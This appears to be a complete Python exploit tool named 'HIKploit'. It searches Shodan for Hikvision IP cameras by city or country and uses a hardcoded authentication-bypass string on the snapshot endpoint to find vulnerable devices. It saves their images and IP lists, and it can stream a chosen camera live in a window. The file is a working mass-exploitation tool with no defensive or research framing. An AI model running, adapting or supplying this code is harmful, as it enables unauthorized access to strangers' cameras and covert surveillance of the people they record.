#!/bin/python

import shodan, requests, sys, time, pathlib, tkinter, io, urllib.request
from PIL import Image
from PIL import ImageTk


#Vulnerability utils
HIKVISION_SHODAN_QUERY = "App-webs+200+OK"
HIKVISION_MAGIC_AUTH = "?auth=YWRtaW46MTEK"
SNAPSHOT_SUFFIX = "/onvif-http/snapshot"


#Arguments
save_vuln_in_file = False
filename = ""
shodan_api_key = ""
city_filter = ""
country_filter = ""
custom_timeout = 1
entries_limit = 0
save_pictures = False
skip_vuln_check = False
is_live_mode = False



#Data variables
ipList = []
ipVuln = []


def getShodanIPs():
    try:
        global ipList
        ipList = []
        api = shodan.Shodan(shodan_api_key)
        query = HIKVISION_SHODAN_QUERY

        if city_filter != "":
            query += " +City:"+city_filter
        if country_filter != "":
            query += " +Country:"+country_filter

        # If the entries limit are lower than 100, free search is used
        # Free search provides upon 100 entries without wasting any token
        if entries_limit > 100:
            counter = 0
            for result in api.search_cursor(query):
                ipList.append(result['ip_str']+':'+str(result['port']))
                counter += 1
                if counter >= entries_limit:
                    break
        else:
            results = api.search(query)
            print('{} cameras found.'.format(results['total']))
            
            for result in results['matches']:
                ipList.append(result['ip_str']+':'+str(result['port']))

    except shodan.APIError as e:
            print('Error: {}'.format(e))


def checkIPs(): 
    print('Looking for vulnerable cameras.')
    global ipVuln
    ipVuln = []
    idx = 1
    for ip in ipList:
        try:
            response = requests.get('http://'+ip+SNAPSHOT_SUFFIX+HIKVISION_MAGIC_AUTH, timeout=custom_timeout)
            if response.status_code == 200: 
                if save_pictures:
                        pathlib.Path("snap").mkdir(parents=True, exist_ok=True)
                        with open('snap/'+ip+'.jpg', 'wb' ) as f:
                            f.write(response.content)
                            f.close()

                ipVuln.append(ip)
        except requests.exceptions.RequestException as e:
            pass
        print("Scanned {} of {} IPs.".format(idx,len(ipList)), end="\r")
        idx+=1
    print("Found {} vulnerable cameras".format(len(ipVuln)))


def saveVulnInFile():
    pathlib.Path("vuln").mkdir(parents=True, exist_ok=True)
    save_filename = "vuln/"+time.strftime("%Y%m%d-%H%M%s")+".txt"
    with open(save_filename, 'w') as f:
        newline = ''
        for line in ipVuln:
            f.write(newline +line)
            newline = '\n'
        f.close()
    print("File {} created.".format(save_filename))


def readFile():
    with open(filename, 'r') as f:
        if skip_vuln_check:
            global ipVuln
            ipVuln = f.read().split('\n')
        else:
            global ipList
            ipList = f.read().split('\n')
        f.close()


def getUrlImage(url):
    global custom_timeout
    try: 
        with urllib.request.urlopen('http://'+url+SNAPSHOT_SUFFIX+HIKVISION_MAGIC_AUTH, timeout=custom_timeout) as conn:
            raw_data = conn.read()
        im = Image.open(io.BytesIO(raw_data))
        im = im.resize((1280, 720), Image.ANTIALIAS)
        image = ImageTk.PhotoImage(im)
        return image
    except:
        if not is_live_mode:
            print('A timeout error has occurred. You can try to increment it with the -t parameter (currently it is {} second).'.format(custom_timeout))
        else:
            print('A timeout error has occurred. Incrementing timeout 1 second (to {} seconds).'.format(custom_timeout + 1))
            custom_timeout += 1


def changeImage(widget, url, root):
    image = getUrlImage(url)
    widget.configure(image=image)
    widget.image = image
    root.after(1000, lambda: changeImage(widget, url, root))


def live(url):
    root = tkinter.Tk()
    root.title("HIKploit LIVE {}".format(url))
    image = getUrlImage(url)
    widget = tkinter.Label(root, image=image)
    widget.grid(row=0, column=0)
    changeImage(widget, url, root)
    root.mainloop()


def readArguments():
    # Number of arguments
    n = len(sys.argv)
    # Arguments passed
    for i in range(1, n):
        #Live
        if sys.argv[i] == "--live" or sys.argv[i] == "-l":
            global is_live_mode
            is_live_mode = True
            live(sys.argv[i + 1])
            break
        #Excution type
        if sys.argv[i] == "--shodan" or sys.argv[i] == "-s":
            global shodan_api_key
            shodan_api_key = sys.argv[i+1]
            i+=1
            continue
        if sys.argv[i] == "--file" or sys.argv[i] == "-f":
            global filename
            filename = sys.argv[i+1]
            i+=1
            continue
        #Shodan arguments
        if shodan_api_key != "": 
            if sys.argv[i] == "--filter-city" or sys.argv[i] == "-c":
                global city_filter
                city_filter = sys.argv[i+1]
                i+=1
                continue
            if sys.argv[i] == "--filter-country" or sys.argv[i] == "-o":
                global country_filter
                country_filter = sys.argv[i+1]
                i+=1
                continue
            if sys.argv[i] == "--limit" or sys.argv[i] == "-i":
                global entries_limit
                entries_limit = int(sys.argv[i+1])
                i+=1
                continue
        
        #Common arguments
        if sys.argv[i] == "--save-vuln" or sys.argv[i] == "-v":
                global save_vuln_in_file
                save_vuln_in_file = True
                continue
        if sys.argv[i] == "--timeout" or sys.argv[i] == "-t":
                global custom_timeout
                custom_timeout = int(sys.argv[i+1])
                i+=1
                continue
        if sys.argv[i] == "--save-pictures" or sys.argv[i] == "-p":
                global save_pictures
                save_pictures = True
                continue
        if sys.argv[i] == "--skip-vuln-check" or sys.argv[i] == "-k":
                global skip_vuln_check
                skip_vuln_check = True
                continue



def main():
    readArguments()
    if shodan_api_key != "":
        getShodanIPs()
        checkIPs()
    elif filename != "":
        readFile()
        if not skip_vuln_check:
            checkIPs()
    if len(ipVuln) > 0 and save_vuln_in_file:
        saveVulnInFile()



main()



